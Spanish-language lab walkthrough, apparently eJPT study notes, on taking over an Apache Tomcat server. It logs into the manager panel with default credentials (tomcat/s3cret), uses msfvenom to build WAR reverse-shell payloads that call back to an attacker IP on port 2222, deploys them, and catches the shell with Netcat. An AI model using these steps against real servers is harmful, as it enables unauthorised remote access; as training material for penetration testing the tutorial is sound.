1. Vemos una web que por el puerto 8080 esta corriendo un servidor **Apache Tomcat**:
![Hacking en Servidores Tomcat 1](ejpt/img/hacking-en-servidores-tomcat-1.png)

2. Nos metemos al puerto 8080 y vemos una pagina **Default Tomcat**:
![Hacking en Servidores Tomcat 2](ejpt/img/hacking-en-servidores-tomcat-2.png)

3. En el apartado **"tomcat9-admin"** vemos un enlace a **"host-manager webapp"** y a **"host-manager webapp"**, podemos imaginar que desde esos enlaces podremos administrar la aplicación web **Apache Tomcat**, entonces probamos a entrar en **"manager webapp"**:
![Hacking en Servidores Tomcat 3](ejpt/img/hacking-en-servidores-tomcat-3.png)

4. Nos pide una contraseña, entonces buscamos en **Google** las contraseñas por defecto de **Tomcat**, siempre al instalar **Tomcat** se ponen unas credenciales por defecto automáticamente:
```
hacktricks apache tomcat default credentials
```

5. Entramos a esta web: https://hacktricks.alquymia.com.br/network-services-pentesting/pentesting-web/tomcat/index.html y vemos que nos dice las credenciales predeterminadas, entonces habría que probar una a una:
![Hacking en Servidores Tomcat 4](ejpt/img/hacking-en-servidores-tomcat-4.png)

6. A veces si le damos al botón **"Cancelar"** en el panel de iniciar sesión nos redirige a una pagina donde salen las credenciales por defecto:
![Hacking en Servidores Tomcat 5](ejpt/img/hacking-en-servidores-tomcat-5.png)

7. Recargamos la pagina **(F5)** e introducimos el usuario **tomcat** y la contraseña **s3cret**:
![Hacking en Servidores Tomcat 6](ejpt/img/hacking-en-servidores-tomcat-6.png)

8. Accedemos al panel de administración de **Tomcat**:
![Hacking en Servidores Tomcat 7](ejpt/img/hacking-en-servidores-tomcat-7.png)

9. Bajamos un poco y nos encontramos un panel de subida de archivos, entonces tendremos que crear un **payload** con extensión **.war** (para **Java**) con **msfvenom** para subirlo al panel de subida de archivos y así obtener acceso al servidor **Apache Tomcat**:
```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.8.116 LPORT=2222 -f war -o reverse1.war
```
![Hacking en Servidores Tomcat 8](ejpt/img/hacking-en-servidores-tomcat-8.png)
![Hacking en Servidores Tomcat 10](ejpt/img/hacking-en-servidores-tomcat-10.png)

- **Si no funciona hay que probar a subir este otro *payload*:**
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.8.116 LPORT=2222 -f war -o reverse2.war
```
![Hacking en Servidores Tomcat 9](ejpt/img/hacking-en-servidores-tomcat-9.png)
- **Recomendable probar con los dos *payloads*.**

10. Subimos los dos **Payloads**:
![Hacking en Servidores Tomcat 10](ejpt/img/hacking-en-servidores-tomcat-10.png)

11. Le damos al botón **"Deploy"** y vemos que se subió correctamente:
![Hacking en Servidores Tomcat 11](ejpt/img/hacking-en-servidores-tomcat-11.png)

12. Vemos que se subió correctamente:
![Hacking en Servidores Tomcat 12](ejpt/img/hacking-en-servidores-tomcat-12.png)

13. Klikamos sobre **"reverse1.war"** y **"reverse2.war"** con el puerto 2222 en escucha con **Netcat** y recibimos la conexión:
![Hacking en Servidores Tomcat 13](ejpt/img/hacking-en-servidores-tomcat-13.png)

14. Si no funciona klikando en reverse1.war hay que probar klikando en reverse2.war:
![Hacking en Servidores Tomcat 14](ejpt/img/hacking-en-servidores-tomcat-14.png)